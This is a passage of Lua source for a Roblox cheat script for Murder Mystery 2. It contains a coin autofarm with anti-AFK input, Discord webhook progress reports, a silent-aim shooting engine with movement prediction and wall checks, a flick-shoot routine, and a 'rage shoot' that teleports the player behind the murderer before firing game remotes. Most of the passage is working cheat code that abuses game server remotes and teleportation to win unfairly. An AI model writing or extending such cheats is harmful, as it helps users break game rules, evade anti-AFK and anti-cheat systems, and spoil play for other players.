        _G.FarmTotalCollected = 0
        _G.FarmLastSessionBag = 0
        _G.FarmCoinsThisMinute = 0
        _G.FarmRateLastMinute = 0
        _G.FarmRateTimer = os.time()
        notify("Coin Farm", "Tracker stats reset", 2, "refresh-cw")
    end
})

-- Action to perform when bag is full
_G.BagFullAction = "Auto by Role (Kill/Fling/Reset)"

UIElements.BagFullAction = CoinFarmTab:Dropdown({
    Title = "On Bag Full — Action",
    Desc = "Choose automatic action based on your role when bag is full",
    Icon = "zap",
    Values = {
        "Auto by Role (Sheriff: Shoot / Innocent: Lobby / Murderer: Kill Everyone)",
        "Rage Shoot (Sheriff)",
        "Teleport to Lobby (Innocent)",
        "Kill Everyone (Murderer)",
        "Reset Character",
    },
    Value = "Auto by Role (Sheriff: Shoot / Innocent: Lobby / Murderer: Kill Everyone)",
    Multi = false,
    AllowNone = false,
    Callback = function(opt)
        _G.BagFullAction = opt
        notify("Coin Farm", "Bag full action: " .. tostring(opt), 2, "zap")
    end
})

UIElements.AntiAFK = CoinFarmTab:Toggle({
    Title = "Anti-AFK",
    Desc = "Prevents AFK kick while farming — sends automatic input",
    Icon = "shield",
    Type = "Checkbox",
    Value = true,
    Callback = function(state)
        _G.RanaxAntiAFK = state
        notify("Anti-AFK", "Anti-AFK " .. (state and "ON " or "OFF"), 2, "shield")
    end
})

CoinFarmTab:Divider()

-- ==================== DISCORD WEBHOOK COIN REPORT ====================
-- Use `or` so re-injection doesn't reset these to defaults
_G.WebhookURL     = (_G.WebhookURL and _G.WebhookURL ~= "") and _G.WebhookURL
                  or ((RANAX_WEBHOOK_URL and RANAX_WEBHOOK_URL ~= "") and RANAX_WEBHOOK_URL or "")
_G.WebhookEnabled = (_G.WebhookEnabled == true) and true or false  -- preserve true across re-inject
_G.HasReportedCoins  = false
_G.WebhookLastSent   = _G.WebhookLastSent or 0
_G.WebhookPeriodicMins = _G.WebhookPeriodicMins or 0

local function sendCoinWebhook(bagVal, maxB, totalVal, timeString, reason)
    local wurl = _G.WebhookURL
    if not _G.WebhookEnabled then return end
    if not wurl or wurl == "" then
        notify("Webhook", "No Webhook URL set!", 3, "x")
        return
    end
    reason = reason or "Bag Full"
    local uid = tostring(LocalPlayer.UserId)

    -- Dynamic accurate rate
    local elapsedSec = os.time() - (_G.FarmStartTime or os.time())
    local rateStr = tostring(_G.FarmRateLastMinute or 0)
    if elapsedSec > 15 and totalVal > 0 then
        local calcRate = math.floor(((totalVal / elapsedSec) * 60) + 0.5)
        rateStr = tostring(calcRate)
    end

    local fillPct = (maxB > 0) and math.floor((bagVal/maxB)*100) or 0
    local statusEmoji = (bagVal >= maxB) and "" or ""

    local colorHex = (reason == "TEST") and 0x5865F2
        or (reason:find("Milestone")) and 0x30FF6A
        or (bagVal >= maxB) and 0xFF4444
        or 0xFFD700

    pcall(function()
        local data = HttpService:JSONEncode({
            ["username"] = "Ranax Coin Tracker",
            ["avatar_url"] = "https://i.imgur.com/4M34hi2.png",
            ["embeds"] = {{
                ["title"] = statusEmoji .. " Ranax MM2 — Coin Farm Report",
                ["description"] = "**Trigger:** `" .. reason .. "`",
                ["color"] = colorHex,
                ["thumbnail"] = {["url"] = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. uid .. "&size=420x420&format=Png"},
                ["fields"] = {
                    {["name"] = " Player",        ["value"] = "`" .. LocalPlayer.Name .. "`",                ["inline"] = true},
                    {["name"] = " Bag",           ["value"] = "`" .. tostring(bagVal) .. "/" .. tostring(maxB) .. " (" .. fillPct .. "%)" .. "`", ["inline"] = true},
                    {["name"] = " Total Coins",   ["value"] = "`" .. tostring(totalVal) .. "`",             ["inline"] = true},
                    {["name"] = " Rate",          ["value"] = "`" .. rateStr .. " coins/min`",             ["inline"] = true},
                    {["name"] = " Session Time",  ["value"] = "`" .. tostring(timeString or "--") .. "`",  ["inline"] = true},
                    {["name"] = " Farming",       ["value"] = (_G.SafeAutoFarm and "` Active`" or "` Stopped`"),       ["inline"] = true},
                },
                ["footer"] = {["text"] = "Ranax Engine  •  MM2 Coin Farmer"},
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        })
        pcall(function()
            ranaxHTTP(wurl, "POST", {["Content-Type"] = "application/json"}, data)
        end)
        _G.WebhookLastSent = os.time()
    end)
end
_G.sendCoinWebhook = sendCoinWebhook

-- ==================== RANAX LEVEL UP WEBHOOK ENGINE ====================
_G.LevelUpWebhookEnabled = true

do
    local function getPlayerLevel()
        local ls = LocalPlayer:FindFirstChild("leaderstats")
        if ls then
            local lvl = ls:FindFirstChild("Level") or ls:FindFirstChild("level") or ls:FindFirstChild("Rank")
            if lvl and lvl.Value then return tonumber(lvl.Value) or 0 end
        end
        local pgui = LocalPlayer:FindFirstChild("PlayerGui")
        if pgui then
            local mg = pgui:FindFirstChild("MainGUI")
            if mg then
                for _, desc in ipairs(mg:GetDescendants()) do
                    if desc:IsA("TextLabel") and desc.Text:find("Level") then
                        local num = desc.Text:match("%d+")
                        if num then return tonumber(num) or 0 end
                    end
                end
            end
        end
        return 0
    end
    _G.getPlayerLevel = getPlayerLevel

    local function getPlayerPrestige()
        local ls = LocalPlayer:FindFirstChild("leaderstats")
        if ls then
            local p = ls:FindFirstChild("Prestige") or ls:FindFirstChild("prestige")
            if p and p.Value then return tonumber(p.Value) or 0 end
        end
        return 0
    end
    _G.getPlayerPrestige = getPlayerPrestige

    local function sendLevelUpWebhook(oldLvl, newLvl, prestigeVal)
        local wurl = _G.WebhookURL
        if not _G.WebhookEnabled and not _G.LevelUpWebhookEnabled then return end
        if not wurl or wurl == "" then return end
        newLvl = newLvl or getPlayerLevel()
        oldLvl = oldLvl or (newLvl > 1 and (newLvl - 1) or 1)
        prestigeVal = prestigeVal or getPlayerPrestige()

        local uid = tostring(LocalPlayer.UserId)
        local diff = os.time() - (_G.FarmStartTime or os.time())
        local tStr = (typeof(fmtTime) == "function") and fmtTime(diff) or (diff .. "s")
        local totalCoins = tostring((_G.FarmTotalCollected or 0) + (_G.FarmLastSessionBag or 0))

        pcall(function()
            local data = HttpService:JSONEncode({
                ["username"] = "Ranax Level Tracker",
                ["avatar_url"] = "https://i.imgur.com/4M34hi2.png",
                ["embeds"] = {{
                    ["title"] = "🎉 LEVEL UP! — Ranax MM2",
                    ["description"] = "🌟 **CONGRATULATIONS! YOUR ACCOUNT LEVELED UP!**\n🔥 **New Level:** `Level " .. tostring(newLvl) .. "`",
                    ["color"] = 0xFFD700,
                    ["thumbnail"] = {["url"] = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. uid .. "&size=420x420&format=Png"},
                    ["fields"] = {
                        {["name"] = "👤 Player",        ["value"] = "`" .. LocalPlayer.Name .. "`",                                ["inline"] = true},
                        {["name"] = "📈 Progression",       ["value"] = "`Level " .. tostring(oldLvl) .. " ➔ Level " .. tostring(newLvl) .. "`", ["inline"] = true},
                        {["name"] = "👑 Prestige",       ["value"] = "`Prestige " .. tostring(prestigeVal) .. "`",                  ["inline"] = true},
                        {["name"] = "💰 Total Coins",   ["value"] = "`" .. totalCoins .. " Coins`",                                 ["inline"] = true},
                        {["name"] = "⏱️ Session Time",  ["value"] = "`" .. tStr .. "`",                                            ["inline"] = true},
                        {["name"] = "🚜 Status",        ["value"] = (_G.SafeAutoFarm and "`🟢 Active Safe Farm`" or "`⚪ Idle`"), ["inline"] = true},
                        {["name"] = "🏆 Achievement",   ["value"] = "```diff\n+ LEVEL UP! Closer to next level and Prestige!\n```", ["inline"] = false},
                    },
                    ["footer"] = {["text"] = "Ranax Engine  •  MM2 Level Progression Tracker"},
                    ["timestamp"] = DateTime.now():ToIsoDate()
                }}
            })
            ranaxHTTP(wurl, "POST", {["Content-Type"] = "application/json"}, data)
        end)
    end
    _G.sendLevelUpWebhook = sendLevelUpWebhook

    -- Instant event listener on leaderstats
    task.spawn(function()
        local ls = LocalPlayer:WaitForChild("leaderstats", 15)
        if ls then
            local lvl = ls:WaitForChild("Level", 10)
            if lvl and lvl:IsA("ValueBase") then
                _G.RanaxLastKnownLevel = tonumber(lvl.Value) or _G.RanaxLastKnownLevel
                lvl.Changed:Connect(function(newVal)
                    local newN = tonumber(newVal)
                    if newN and _G.RanaxLastKnownLevel and newN > _G.RanaxLastKnownLevel then
                        local oldL = _G.RanaxLastKnownLevel
                        _G.RanaxLastKnownLevel = newN
                        task.spawn(function()
                            sendLevelUpWebhook(oldL, newN)
                            notify("Level Up", "Level Up! " .. tostring(oldL) .. " ➔ " .. tostring(newN), 3.5, "award")
                        end)
                    elseif newN then
                        _G.RanaxLastKnownLevel = newN
                    end
                end)
            end
        end
    end)
end

-- Periodic webhook loop
task.spawn(function()
    while true do
        task.wait(30)
        pcall(function()
            local mins = tonumber(_G.WebhookPeriodicMins) or 0
            if _G.WebhookEnabled and mins > 0 then
                local elapsed = os.time() - (_G.WebhookLastSent or 0)
                if elapsed >= (mins * 60) then
                    local bVal, mB = getCoinBagLive()
                    local tVal = (_G.FarmTotalCollected or 0) + bVal
                    local tStr = fmtTime(os.time() - (_G.FarmStartTime or os.time()))
                    sendCoinWebhook(bVal, mB, tVal, tStr, "Periodic Update")
                    notify("Webhook", "Periodic report sent!", 2, "bell")
                end
            end
        end)
    end
end)

CoinFarmTab:Section({
    Title = "Discord Webhook Notification",
    TextSize = 15
})

CoinFarmTab:Input({
    Title = "Discord Webhook URL",
    Desc = "Enter your Discord Webhook URL for live coin farming reports",
    Placeholder = "https://discord.com/api/webhooks/...",
    Callback = function(text)
        text = tostring(text or ""):gsub("%s+", "")
        _G.WebhookURL = text
        if text ~= "" then
            notify("Webhook", "Webhook URL saved!", 2, "link")
        end
    end
})

UIElements.WebhookEnabled = CoinFarmTab:Toggle({
    Title = "Enable Coin Webhook",
    Desc = "Sends a Discord notification whenever your coin bag is full or reaches milestones",
    Icon = "bell",
    Type = "Checkbox",
    Value = _G.WebhookEnabled,
    Callback = function(val)
        _G.WebhookEnabled = val
        notify("Webhook", "Coin Webhook " .. (val and "ENABLED" or "DISABLED"), 2, "bell")
    end
})

UIElements.LevelUpWebhook = CoinFarmTab:Toggle({
    Title = "Enable Level Up Webhook",
    Desc = "Sends a Discord celebration report whenever your account levels up",
    Icon = "award",
    Type = "Checkbox",
    Value = true,
    Callback = function(val)
        _G.LevelUpWebhookEnabled = val
        notify("Webhook", "Level Up Webhook " .. (val and "ENABLED" or "DISABLED"), 2, "award")
    end
})

CoinFarmTab:Slider({
    Title = "Periodic Report (minutes)",
    Desc = "Send webhook every N minutes. Set to 0 to disable periodic reports.",
    Icon = "clock",
    Step = 1,
    Value = { Min = 0, Max = 60, Default = 0 },
    Callback = function(val)
        _G.WebhookPeriodicMins = val
        if val > 0 then
            notify("Webhook", "Periodic report every " .. val .. " min", 2, "clock")
        end
    end
})

CoinFarmTab:Button({
    Title = "Send Test Webhook",
    Desc = "Sends a test report with current stats to your webhook URL",
    Locked = false,
    Callback = function()
        if not _G.WebhookURL or _G.WebhookURL == "" then
            notify("Webhook", "Please enter a Webhook URL first!", 3, "x")
            return
        end
        local bVal, mB = getCoinBagLive()
        local tVal = (_G.FarmTotalCollected or 0) + bVal
        local tStr = fmtTime(os.time() - (_G.FarmStartTime or os.time()))
        local prev = _G.WebhookEnabled
        _G.WebhookEnabled = true  -- force send regardless of toggle
        sendCoinWebhook(bVal, mB, tVal, tStr, "TEST")
        _G.WebhookEnabled = prev
        notify("Webhook", "Test webhook sent!", 2, "check")
    end
})

CoinFarmTab:Button({
    Title = "Send Test Level Up Webhook",
    Desc = "Sends a preview of the Level Up celebration report to your webhook",
    Locked = false,
    Callback = function()
        if not _G.WebhookURL or _G.WebhookURL == "" then
            notify("Webhook", "Please enter a Webhook URL first!", 3, "x")
            return
        end
        local curL = (typeof(_G.getPlayerLevel) == "function") and _G.getPlayerLevel() or 45
        if curL == 0 then curL = 45 end
        local pVal = (typeof(_G.getPlayerPrestige) == "function") and _G.getPlayerPrestige() or 1
        local prev = _G.LevelUpWebhookEnabled
        _G.LevelUpWebhookEnabled = true
        _G.sendLevelUpWebhook(curL - 1, curL, pVal)
        _G.LevelUpWebhookEnabled = prev
        notify("Webhook", "Test Level Up webhook sent!", 2, "award")
    end
})
-------------------------------------------------------------------------------------------------------------------
-- ==================== RANAX ADVANCED MM2 SHOOT ENGINE ====================
local Camera = Workspace.CurrentCamera
Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
    Camera = Workspace.CurrentCamera or Camera
end)

local fovCircle = nil
pcall(function()
    if typeof(Drawing) == "table" and Drawing.new then
        fovCircle = Drawing.new("Circle")
        fovCircle.Thickness = 1.5
        fovCircle.Color = Color3.fromRGB(48, 255, 106)
        fovCircle.Filled = false
        fovCircle.Transparency = 0.8
        fovCircle.NumSides = 64
        fovCircle.Radius = V.RanaxFovRadius or 120
        fovCircle.Visible = false
    end
end)

local function getMurdererTarget()
    local function isKnifeTool(tool)
        if not (tool and tool:IsA("Tool")) then return false end
        local n = tool.Name:lower()
        if n:find("knife") or n:find("blade") or n:find("dagger") or n:find("scythe") or n:find("sword") or n:find("bat") or n:find("harvester") or n:find("axe") or n:find("slash") or n:find("candy") then
            return true
        end
        if tool:FindFirstChild("KnifeServer") or tool:FindFirstChild("HandleTouched", true) or tool:FindFirstChild("Stab", true) then
            return true
        end
        if not (tool:FindFirstChild("GunServer") or tool:FindFirstChild("Shoot", true) or n:find("gun") or n:find("revolver") or n:find("luger") or n:find("pistol")) then
            return true
        end
        return false
    end

    -- 1) Role listesinden murderer bul
    local roles = GlobalPlayerRoles or getgenv().PlayerRoles or getgenv().NameRoles or {}
    for id, data in pairs(roles) do
        if data and typeof(data) == "table" and data.Role and tostring(data.Role):lower():find("murd") then
            for _, p in ipairs(Players:GetPlayers()) do
                if (tostring(p.UserId) == tostring(id) or p.Name == id or p.Name == tostring(id)) and p ~= LocalPlayer and not IsFriend(p) then
                    local hum = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
                    local hrp = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                    if hum and hum.Health > 0 and hrp then
                        return p
                    end
                end
            end
        end
    end

    -- 2) Find player holding or carrying ANY knife skin (Character or Backpack)
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and not IsFriend(p) and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
            if hum and hum.Health > 0 and hrp then
                local foundKnife = false
                for _, t in ipairs(p.Character:GetChildren()) do
                    if isKnifeTool(t) then foundKnife = true; break end
                end
                if not foundKnife and p:FindFirstChild("Backpack") then
                    for _, t in ipairs(p.Backpack:GetChildren()) do
                        if isKnifeTool(t) then foundKnife = true; break end
                    end
                end
                if foundKnife then return p end
            end
        end
    end
    return nil
end

local function getSheriffGunTool()
    local char = LocalPlayer.Character
    if not char then return nil end
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local hum = char:FindFirstChildOfClass("Humanoid")
    
    local function isGun(tool)
        if not (tool and tool:IsA("Tool")) then return false end
        local n = tool.Name:lower()
        return n:find("gun") or n:find("revolver") or n:find("luger") or n:find("pistol") or n:find("blaster") or n:find("shotgun") or tool:FindFirstChild("GunServer") or tool:FindFirstChild("RaycastAttachment", true) or tool:FindFirstChild("Shoot", true) or tool:FindFirstChild("Fire", true)
    end

    -- 1. Check currently held weapon
    for _, obj in ipairs(char:GetChildren()) do
        if isGun(obj) then
            return obj
        end
    end

    -- 2. Check backpack and equip immediately
    if backpack then
        for _, obj in ipairs(backpack:GetChildren()) do
            if isGun(obj) then
                if hum then
                    pcall(function() hum:EquipTool(obj) end)
                end
                if obj.Parent ~= char then
                    pcall(function() obj.Parent = char end)
                end
                local t0 = os.clock()
                while obj.Parent ~= char and os.clock() - t0 < 0.12 do
                    RunService.RenderStepped:Wait()
                end
                return obj
            end
        end
    end

    return char:FindFirstChild("Gun") or char:FindFirstChild("Revolver")
end

local function getSheriffShootRemote(gun)
    if not gun then return nil end
    for _, name in ipairs({ "Shoot", "Fire", "ShootRemote", "FireEvent", "Shot", "Shooting" }) do
        local r = gun:FindFirstChild(name, true)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, d in ipairs(gun:GetDescendants()) do
        if d:IsA("RemoteEvent") and not d.Name:lower():find("reload") then
            return d
        end
    end
    -- Gameplay remotes inside ReplicatedStorage
    if Remotes then
        local r = Remotes:FindFirstChild("Shoot") or Remotes:FindFirstChild("Fire")
        if r and r:IsA("RemoteEvent") then return r end
    end
    return nil
end

local function getSheriffOrigin(gun)
    local char = LocalPlayer.Character
    if not char then return Vector3.zero end

    if gun then
        local gunServer = gun:FindFirstChild("GunServer")
        if gunServer then
            local attachment = gunServer:FindFirstChild("GunRaycastAttachment1") or gunServer:FindFirstChild("RaycastAttachment")
            if attachment then return attachment.WorldCFrame.Position end
        end
        local handle = gun:FindFirstChild("Handle") or gun:FindFirstChild("Gun")
        if handle and handle:IsA("BasePart") then
            return handle.Position
        end
    end

    local part = char:FindFirstChild("RightHand") or char:FindFirstChild("Right Arm") or char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
    return part and part.Position or Vector3.zero
end

-- Ranax Advanced MM2 Lead & Distance Prediction
local function getPredictedMurdererPosition(hrp, hum, offset, origin)
    local vel = Vector3.zero
    pcall(function() vel = hrp.AssemblyLinearVelocity end)
    if not vel or vel.Magnitude == 0 then pcall(function() vel = hrp.Velocity end) end
    vel = Vector3.new(vel.X, 0, vel.Z)

    local moveDir = (hum and hum.MoveDirection) or Vector3.zero
    moveDir = Vector3.new(moveDir.X, 0, moveDir.Z)

    local dist = 1
    if origin and hrp then
        dist = math.clamp((hrp.Position - origin).Magnitude / 50, 0.4, 2.5)
    end

    local leadMult = (offset or 2.8) * dist
    return hrp.Position + (vel * 0.65) * (leadMult / 14) + (moveDir * leadMult)
end

local function checkSheriffWallPass(origin, targetPos, targetChar)
    if not V.RanaxWallCheck then return true end
    local dir = targetPos - origin
    if dir.Magnitude < 1 then return true end

    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Exclude
    local excludeList = { LocalPlayer.Character }
    for _, p in ipairs(Players:GetPlayers()) do
        if IsFriend(p) and p.Character then table.insert(excludeList, p.Character) end
    end
    rayParams.FilterDescendantsInstances = excludeList

    local result = Workspace:Raycast(origin, dir, rayParams)
    if not result then return true end
    if targetChar and result.Instance and result.Instance:IsDescendantOf(targetChar) then return true end
    if result.Instance and (result.Instance.Transparency > 0.65 or result.Instance.CanCollide == false) then return true end

    return false
end

local sheriffFlickInProgress = false
local function executeRanaxSheriffShoot()
    local char = LocalPlayer.Character
    local myHRP = char and char:FindFirstChild("HumanoidRootPart")
    local myHum = char and char:FindFirstChildOfClass("Humanoid")
    if not (char and myHRP and myHum and myHum.Health > 0) then return false, "Character not ready" end

    local gun = getSheriffGunTool()
    if not gun then return false, "You need a Gun to shoot!" end

    local remote = getSheriffShootRemote(gun)
    if not remote then return false, "Shoot remote not found" end

    local target = getMurdererTarget()
    if not target or not target.Character then return false, "No Murderer found" end

    local tHRP = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
    local tHum = target.Character:FindFirstChildOfClass("Humanoid")
    if not (tHRP and tHum and tHum.Health > 0) then return false, "Murderer not alive" end

    -- FOV check
    if V.RanaxFovShow and Camera then
        local screenPos, onScreen = Camera:WorldToViewportPoint(tHRP.Position)
        if onScreen then
            local center = Camera.ViewportSize / 2
            local dist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
            if dist > (V.RanaxFovRadius or 120) then
                return false, "Murderer outside FOV"
            end
        end
    end

    local origin = getSheriffOrigin(gun)
    local hitPos = getPredictedMurdererPosition(tHRP, tHum, V.RanaxPredictOffset or 2.8, origin)

    -- Wall check (try from HRP or Head)
    if not checkSheriffWallPass(origin, hitPos, target.Character) then
        local tHead = target.Character:FindFirstChild("Head")
        if tHead and checkSheriffWallPass(origin, tHead.Position, target.Character) then
            hitPos = tHead.Position
        else
            return false, "Wall in between"
        end
    end

    -- ==================== RANAX FLICK SHOOT MOTORU (SMOOTH HUMAN-LIKE) ====================
    if V.RanaxFlickEnabled and not sheriffFlickInProgress then
        sheriffFlickInProgress = true
        local savedCFrame = myHRP.CFrame
        local savedAutoRotate = myHum.AutoRotate

        pcall(function()
            myHum.AutoRotate = false
            local startCF = myHRP.CFrame
            local lookAtVector = Vector3.new(hitPos.X, myHRP.Position.Y, hitPos.Z)
            local targetRotCF = CFrame.lookAt(myHRP.Position, lookAtVector)

            local savedCamCF = (Camera and Camera.CFrame)
            local targetCamCF = (Camera and savedCamCF and CFrame.lookAt(savedCamCF.Position, hitPos))

            -- 1. Human-like smooth flick rotation (Smooth Cubic Lerp)
            local turnTime = math.clamp(V.RanaxFlickTurnTime or 0.08, 0.04, 0.20)
            local steps = math.max(3, math.floor(turnTime / 0.016))
            for i = 1, steps do
                local alpha = i / steps
                local smoothAlpha = alpha * alpha * (3 - 2 * alpha)
                local curCF = startCF:Lerp(targetRotCF, smoothAlpha)
                myHRP.CFrame = curCF
                char:PivotTo(curCF)
                if V.RanaxFlickCamera and Camera and savedCamCF and targetCamCF then
                    Camera.CFrame = savedCamCF:Lerp(targetCamCF, smoothAlpha)
                end
                RunService.RenderStepped:Wait()
            end

            -- 2. Fire the weapon
            local newOrigin = getSheriffOrigin(gun)
            if newOrigin ~= Vector3.zero then origin = newOrigin end

            local aimCFrame = CFrame.lookAt(origin, hitPos)
            pcall(function() remote:FireServer(aimCFrame, CFrame.new(hitPos)) end)
            pcall(function() remote:FireServer(aimCFrame, hitPos) end)
            pcall(function() remote:FireServer(CFrame.new(origin, hitPos), CFrame.new(hitPos)) end)
            pcall(function() remote:FireServer(hitPos) end)
            pcall(function() gun:Activate() end)

            -- 3. Short natural pause
            task.wait(0.03)

            -- 4. Natural return rotation (Smooth Return)
            local returnSteps = math.max(2, math.floor(steps * 0.7))
            local currentFacing = myHRP.CFrame
            local returnCF = CFrame.new(myHRP.Position) * (savedCFrame - savedCFrame.Position)
            local currentFacingCam = (Camera and Camera.CFrame)

            for i = 1, returnSteps do
                local alpha = i / returnSteps
                local smoothAlpha = alpha * alpha * (3 - 2 * alpha)
                local curCF = currentFacing:Lerp(returnCF, smoothAlpha)
                myHRP.CFrame = curCF
                char:PivotTo(curCF)
                if V.RanaxFlickCamera and Camera and currentFacingCam and savedCamCF then
                    Camera.CFrame = currentFacingCam:Lerp(savedCamCF, smoothAlpha)
                end
                RunService.RenderStepped:Wait()
            end

            if V.RanaxFlickCamera and Camera and savedCamCF then
                Camera.CFrame = savedCamCF
            end
        end)

        pcall(function()
            myHum.AutoRotate = savedAutoRotate
        end)
        sheriffFlickInProgress = false
    else
        -- Standard Silent Aim Direct Fire
        local aimCFrame = CFrame.lookAt(origin, hitPos)
        pcall(function() remote:FireServer(aimCFrame, CFrame.new(hitPos)) end)
        pcall(function() remote:FireServer(aimCFrame, hitPos) end)
        pcall(function() remote:FireServer(CFrame.new(origin, hitPos), CFrame.new(hitPos)) end)
        pcall(function() remote:FireServer(hitPos) end)
        pcall(function() gun:Activate() end)
    end

    return true, target.Name
end

-- ==================== RANAX RAGE SHOOT ENGINE (WALLBANG / PENETRATE WALLS) ====================
do
    local function executeRanaxRageShoot()
        local char = LocalPlayer.Character
        local myHRP = char and char:FindFirstChild("HumanoidRootPart")
        local myHum = char and char:FindFirstChildOfClass("Humanoid")
        if not (char and myHRP and myHum and myHum.Health > 0) then return false, "Character not ready" end

        -- 1. Find Gun tool (equipped or in backpack)
        local gun = getSheriffGunTool()
        if not gun then
            for _, t in ipairs(LocalPlayer.Backpack:GetChildren()) do
                if t:IsA("Tool") and (t.Name:lower():find("gun") or t.Name:lower():find("revolver") or t.Name:lower():find("luger") or t:FindFirstChild("Shoot", true) or t:FindFirstChild("GunServer")) then
                    gun = t
                    break
                end
            end
        end
        if not gun then return false, "No Gun tool" end

        if gun.Parent ~= char then
            pcall(function() myHum:EquipTool(gun) end)
            local eqT = os.clock()
            while gun.Parent ~= char and os.clock() - eqT < 0.3 do
                task.wait(0.02)
            end
        end

        -- 2. Find Murderer Target
        local target = getMurdererTarget()
        if not target or not target.Character then
            local mFn = getMurderer or _G.getMurderer or (typeof(getMurdererLive) == "function" and getMurdererLive)
            local mPlr = mFn and mFn()
            if mPlr and mPlr.Character then target = mPlr end
        end
        if not target or not target.Character then return false, "No Murderer found" end

        local tHRP = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
        local tHum = target.Character:FindFirstChildOfClass("Humanoid")
        if not (tHRP and tHum and tHum.Health > 0) then return false, "Murderer not alive" end

        -- 3. Get Shoot Remote
        local remote = getSheriffShootRemote(gun) or gun:FindFirstChild("Shoot", true) or ReplicatedStorage:FindFirstChild("ShootGun")
        if not remote then return false, "Shoot remote not found" end

        -- 4. Safe Vantage Point Shooting (Position 16 studs back, 4.5 studs up -- OUT OF KNIFE RANGE!)
        local oldCF = myHRP.CFrame
        local lookDir = tHRP.CFrame.LookVector
        local safePos = tHRP.Position - (Vector3.new(lookDir.X, 0, lookDir.Z).Unit * 16.0) + Vector3.new(0, 4.5, 0)
        local strikeCF = CFrame.lookAt(safePos, tHRP.Position)
        myHRP.CFrame = strikeCF
        char:PivotTo(strikeCF)
        myHRP.AssemblyLinearVelocity = Vector3.zero
        myHRP.Velocity = Vector3.zero

        -- Wait 0.15s for shooter replication
        task.wait(0.15)

        local tHead = target.Character:FindFirstChild("Head") or tHRP
        local targetPos = tHead.Position
        local handle = gun:FindFirstChild("Handle") or myHRP
        local originPos = handle.Position

        -- Comprehensive MM2 Gun Shoot Remote formats
        pcall(function() remote:FireServer(handle.CFrame, CFrame.new(targetPos)) end)
        pcall(function() remote:FireServer(CFrame.lookAt(originPos, targetPos), CFrame.new(targetPos)) end)
        pcall(function() remote:FireServer(CFrame.lookAt(originPos, targetPos), targetPos) end)
        pcall(function() remote:FireServer(1, targetPos) end)
        pcall(function() remote:FireServer(targetPos) end)
        pcall(function() gun:Activate() end)

        -- 5. Active Kill Verification: Check if Murderer died from shot
        local checkStart = os.clock()
        local targetDied = false
        while os.clock() - checkStart < 0.65 do
            if not target or not target.Character or not tHum or not tHum.Parent or tHum.Health <= 0 then
                targetDied = true
                break
            end
            task.wait(0.04)
        end

        -- NO SUICIDAL FLING! A Sheriff has a gun and shoots from safe distance.
        if targetDied then
            notify("Rage Shoot", "Eliminated Murderer: " .. tostring(target.Name), 2.5, "skull")
            if _G.AutoChatKill then
                task.delay(0.2, function()
                    local kmsg = _G.AutoChatKillMsg or "ez"
                    if kmsg and kmsg ~= "" then
                        sendRobloxChatMessage(kmsg)
                    end
                end)
            end
            return true, target.Name
        else
            return false, "Murderer survived shot"
        end
    end
    _G.executeRanaxRageShoot = executeRanaxRageShoot
end

-- FOV Circle Cizimi
if fovCircle then
    RunService.RenderStepped:Connect(function()
        if not (V.RanaxFovShow == true) then
            if fovCircle.Visible then fovCircle.Visible = false end
            return
        end
        if Camera then
            fovCircle.Radius = V.RanaxFovRadius or 120
            fovCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
            fovCircle.Visible = not sheriffFlickInProgress
        end
    end)
end

-- Auto-Shoot Dongusu
task.spawn(function()
    while true do
        if V.RanaxAutoShoot then
            pcall(executeRanaxSheriffShoot)
            task.wait(V.RanaxShootDelay or 0.1)
        else
            task.wait(0.5)
        end
    end
end)

-- ==================== RANAX SHOOT V2 COMBAT SYSTEM ====================
_G.RanaxShootingMethod = "New (blatant)"
_G.RanaxPredictionMultiplier = 0.125
_G.RanaxSilentAimWallCheck = false
_G.RanaxAutoShootV2 = false

local function getRanaxCombatDataV2()
    local char = LocalPlayer.Character
    local myHRP = char and char:FindFirstChild("HumanoidRootPart")
    local arm = char and (char:FindFirstChild("Right Arm") or char:FindFirstChild("RightHand"))
    if not myHRP or not arm then return nil end

    local target = nil
    if _G.RanaxPrivateSrv then
        -- PRIVATE SRV MODE: target closest alive player (not self, not friends)
        local bestDist = math.huge
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and not IsFriend(p) and not isProtected(p) then
                local pH = p.Character:FindFirstChild("HumanoidRootPart")
                local pHum = p.Character:FindFirstChildOfClass("Humanoid")
                if pH and pHum and pHum.Health > 0 then
                    local d = (myHRP.Position - pH.Position).Magnitude
                    if d < bestDist then
                        bestDist = d
                        target = p
                    end
                end
            end
        end
    else
        -- NORMAL MODE: target the murderer (knife holder)
        for _, p in ipairs(Players:GetPlayers()) do
            -- Skip friends and protected players (Shoot v2 / Flick v2 / Wall Check protection)
            if p ~= LocalPlayer and p.Character and not IsFriend(p) and not isProtected(p) then
                if p.Character:FindFirstChild("Knife") or (p:FindFirstChild("Backpack") and p.Backpack:FindFirstChild("Knife")) then
                    target = p
                    break
                end
            end
        end
    end

    if not target or not target.Character:FindFirstChild("HumanoidRootPart") then return nil end

    local root = target.Character.HumanoidRootPart
    local velocity = root.AssemblyLinearVelocity
    local activeMethod = _G.RanaxShootingMethod or "New (blatant)"

    if activeMethod == "New (blatant)" and _G.RanaxSilentAimWallCheck then
        local visible = false
        local partsToCheck = {target.Character:FindFirstChild("Head"), root, target.Character:FindFirstChild("UpperTorso")}
        local rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        local ignoreList = {}
        for _, v in ipairs(Players:GetPlayers()) do
            if v.Character then table.insert(ignoreList, v.Character) end
        end
        rayParams.FilterDescendantsInstances = ignoreList

        for _, part in ipairs(partsToCheck) do
            if part then
